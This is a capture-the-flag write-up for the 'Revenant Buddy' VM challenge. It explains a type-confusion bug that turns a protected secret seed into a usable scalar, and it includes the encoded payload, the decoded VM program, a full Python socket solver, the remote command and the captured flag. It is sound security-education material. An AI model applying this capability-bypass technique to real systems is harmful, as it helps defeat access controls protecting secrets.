# Revenant Buddy — Writeup

## Flag

```
ASIS{8bf2fd2a3f7eecec5f5fab1861e51c579975ba45}
```

## TL;DR

Revenant Buddy is a small client/server VM challenge. The service prints a banner like:

```
RB/2 release=fe753d7fdd51acc3b3a23109 words=64 regs=8
```

It accepts one main command:

```
RUN <hex-encoded-program>
```

The bug is in the VM's value/type handling. A privileged secret seed is available inside the VM in a protected register, but arithmetic/type propagation can be abused to convert it into a normal scalar without changing the underlying value. Once the seed is available as a scalar, we can derive the export capability and call the VM export primitive to read the secret file.

Final payload:

```
4285cfe9c40257076ac2e0b0dafabec8ad3e5f973bcb81d3
```

Running it against the remote returns the flag.

## Files

The archive contains two stripped static PIE ELF binaries:

- `revenant-supervisor`
- `revenant-worker`

`revenant-supervisor` starts the worker and sets up the secret directory / flag environment. `revenant-worker` implements the text protocol and executes the tiny VM program sent through `RUN`.

Useful strings from the worker show the protocol and success/error states:

```
RB/2 release=%s words=%u regs=%u
RUN
ERR program
ERR capability
ERR export-open
ERR export-read
OK %s
OK halted
ERR executor
ERR command
flag
```

So the intended target is not shell execution. The goal is to satisfy the VM capability checks and trigger the internal export/read path.

## Protocol

The service speaks a very small line-based protocol:

```
RUN <program_hex>\n
```

On connect, the worker sends the VM metadata:

```
RB/2 release=<release-id> words=64 regs=8
```

The solver sends one encoded VM program:

```python
PAYLOAD_HEX = "4285cfe9c40257076ac2e0b0dafabec8ad3e5f973bcb81d3"
```

If the VM program reaches the export primitive correctly, the service responds:

```
OK ASIS{...}
```

## VM Model

The VM has:

- 64 words
- 8 registers

One important internal register is `r7`. It contains the supervisor secret seed. The VM tries to protect this value using capability/value types, so a normal program should not be able to simply read the secret seed as an integer.

The export path expects two values:

- seed
- export capability derived from seed

If both match, the worker opens/reads the secret named `flag` and returns it with `OK <flag>`.

## Vulnerability

The VM tracks both value and type. The intended security rule is roughly:

> secret/capability value must not become a normal scalar

But the arithmetic operations allow a type confusion. By combining a protected value with an expression that evaluates to zero, the numeric value remains unchanged, while the resulting type can become scalar.

The key trick is:

```
r1 = r7 ^ ((1 + 1) * r0)
```

Because `r0` is zero:

```
((1 + 1) * r0) == 0
```

So numerically:

```
r1 = r7 ^ 0 = r7
```

But the VM's type propagation treats the result as a usable scalar. This leaks/converts the protected seed into a normal register.

The same idea is used again on the derived export capability so it can be passed into the export primitive as an accepted scalar/capability argument.

## Exploit Program

Decoded logic of the final VM program:

```
magic
r1 = r7 ^ ((1 + 1) * r0)       # r7 is supervisor secret seed, r0 is 0, so r1 = seed as scalar
r2 = fmix(r7 ^ CONST)           # derive export capability from seed
r3 = r2 ^ ((1 + 1) * r0)        # convert derived capability into accepted scalar form
capability_export(r1, r3)       # open/read secret flag
halt
```

The actual bytes sent to the service are obfuscated/encoded for the worker's `RUN` parser:

```
4285cfe9c40257076ac2e0b0dafabec8ad3e5f973bcb81d3
```

## Solver

```python
#!/usr/bin/env python3
import re
import socket
import sys

PAYLOAD_HEX = "4285cfe9c40257076ac2e0b0dafabec8ad3e5f973bcb81d3"


def recv_some(sock: socket.socket, timeout: float = 2.0) -> bytes:
    sock.settimeout(timeout)
    out = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
        if b"\n" in chunk:
            break
    return out


def main() -> int:
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} HOST PORT", file=sys.stderr)
        return 2

    host = sys.argv[1]
    port = int(sys.argv[2])

    with socket.create_connection((host, port), timeout=8) as s:
        banner = recv_some(s, 3)
        if banner:
            print(banner.decode(errors="replace").rstrip())

        s.sendall(b"RUN " + PAYLOAD_HEX.encode() + b"\n")

        data = b""
        s.settimeout(5)
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if b"OK " in data or b"ERR " in data:
                break

        text = data.decode(errors="replace")
        print(text.rstrip())

        m = re.search(r"([A-Z0-9_]+\{[^\r\n}]+\})", text)
        if m:
            print(f"<FLAG>{m.group(1)}</FLAG>")
            return 0

        return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

## Run

```
python3 solve.py 91.107.151.102 18113
```

Output:

```
RB/2 release=fe753d7fdd51acc3b3a23109 words=64 regs=8
OK ASIS{8bf2fd2a3f7eecec5f5fab1861e51c579975ba45}
<FLAG>ASIS{8bf2fd2a3f7eecec5f5fab1861e51c579975ba45}</FLAG>
```
